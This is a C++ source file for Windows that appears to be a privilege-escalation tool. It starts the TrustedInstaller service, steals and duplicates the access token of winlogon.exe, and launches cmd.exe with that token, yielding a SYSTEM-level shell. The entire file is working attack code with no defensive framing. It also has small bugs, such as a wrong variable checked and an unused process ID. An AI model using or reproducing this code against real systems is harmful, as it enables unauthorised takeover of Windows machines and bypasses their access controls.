#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>



BOOL StartTrustedInstallerService() {
	//Get a Handler to the SCM database

	SC_HANDLE schSCManager = OpenSCManager(
		NULL,     //Local Computer
		NULL,
		SC_MANAGER_ALL_ACCESS
	);

	if (NULL == schSCManager)
	{
		printf("[-] OpenSCManager failed (%d)\n", GetLastError());
		return FALSE;
	}
	printf("[+] OpenSCManager success!\n");

	// Get a handler to the service

	SC_HANDLE schService = OpenService(
		schSCManager,     //SCM database
		L"TrustedInstaller",  // Name of Service
		SERVICE_START
	);

	if (schService == NULL)
	{
		printf("[-] OpenService failed (%d)\n", GetLastError()); CloseServiceHandle(schSCManager);
		return FALSE;
	}

	if (!StartService(schService, 0, NULL))
	{
		if (ERROR_SERVICE_ALREADY_RUNNING == GetLastError())
		{
			printf("[+] Trusted Installer Already running\n");
			SetLastError(0);
		}
		else
		{
			printf("[-] TrustedInstaller Start Service failed (%d)\n", GetLastError());
			CloseServiceHandle(schService);
			CloseServiceHandle(schSCManager);
			return FALSE;
		}
	}

	Sleep(2000);
	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);

	return TRUE;
}

int GetProcessByName(PCWSTR name)
{
	DWORD pid = 0;

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process;
	ZeroMemory(&process, sizeof(process));
	process.dwSize = sizeof(process);

	//walkthrough all Processes
	if (Process32First(snapshot, &process))
	{
		do
		{
			if (wcscmp(process.szExeFile, name) == 0)
			{
				return process.th32ProcessID;
			}
		} while (Process32Next(snapshot, &process));
	}

	CloseHandle(snapshot);

	return NULL;
}

int main(int argc, char** argv)
{
	//int f = mm(4, 5);
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);

	if (StartTrustedInstallerService())
	{
		printf("[+] TrustedInstaller Service Started!\n");
	}
	else
	{
		exit(1);
	}

	printf("[+] Current user is : ");

	DWORD  PID_TO_IMPERSONATE = GetProcessByName(L"winlogon.exe");
	if (PID_TO_IMPERSONATE == NULL)
	{
		printf("[-] Winlogon process not found\n");
		exit(1);
	}
	else
	{
		printf("[+] Winlogon process found!\n");
	}

	DWORD  TI_PROCESS = GetProcessByName(L"TrustedInstaller.exe");
	if (PID_TO_IMPERSONATE == NULL)
	{
		printf("[-] TrustedInstaller process not found\n");
		exit(1);
	}
	else
	{
		printf("[+] TrustedInstaller process found!\n");
	}


	HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
	if (GetLastError() == NULL) printf("[+] WINLOGON OpenProcess() success!\n");
	else
	{
		printf("[-] WINLOGON OpenProcess() Return Code: %i\n", processHandle);
		printf("[-] WINLOGON OpenProcess() Error: %i\n", GetLastError());
	}

	BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle);
	if (GetLastError() == NULL) printf("[+] WINLOGON OpenProcessToken() success!\n");
	else
	{
		printf("[-] WINLOGON OpenProcessToken() Return Code: %i\n", getToken);
		printf("[-] WINLOGON OpenProcessToken() Error: %i\n", GetLastError());
	}

	BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);

	if (GetLastError() == NULL)
	{
		printf("[+] WINLOGON ImpersonatedLoggedOnUser() success!\n");
		printf("[+] WINLOGON Current user is: ss");
	}

	BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
	BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);

}

